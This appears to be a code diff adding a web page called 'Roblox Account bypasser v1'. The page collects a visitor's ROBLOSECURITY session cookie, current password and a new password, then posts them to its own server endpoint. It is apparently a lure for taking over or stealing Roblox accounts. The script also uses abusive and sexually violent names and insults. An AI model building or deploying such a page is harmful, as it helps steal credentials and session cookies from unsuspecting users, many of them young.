@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account bypasser v1</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: #1a1a1a;
+            color: white;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle, transparent 20%, #1a1a1a 20%, #1a1a1a 80%, transparent 80%, transparent),
+                        radial-gradient(circle, transparent 20%, #1a1a1a 20%, #1a1a1a 80%, transparent 80%, transparent) 50px 50px;
+            background-size: 100px 100px;
+            animation: moveDots 4s linear infinite;
+        }
+        @keyframes moveDots {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50px); }
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 300px;
+        }
+        button {
+            background: #800080;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #660066;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="container">
+        <h1>Roblox Account bypasser v1</h1>
+        <input type="text" id="cookie" placeholder="ROBLOSECURITY Cookie">
+        <input type="password" id="password" placeholder="Current Password">
+        <input type="password" id="newPassword" placeholder="New Password">
+        <button onclick="executeRape()">Update Account</button>
+    </div>
+
+    <script>
+        async function executeRape() {
+            const cookie = document.getElementById('cookie').value;
+            const password = document.getElementById('password').value;
+            const newPassword = document.getElementById('newPassword').value;
+
+            if (!cookie || !password || !newPassword) {
+                alert("Fill in all fields, you dumb fuck.");
+                return;
+            }
+
+            try {
+                const response = await fetch('/fuck-account', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie, password, new_password: newPassword })
+                });
+
+                const result = await response.json();
+                alert(result.success || result.error);
+            } catch (error) {
+                alert(`Something went wrong: ${error.message}`);
+            }
+        }
+    </script>
+</body>
+</html>
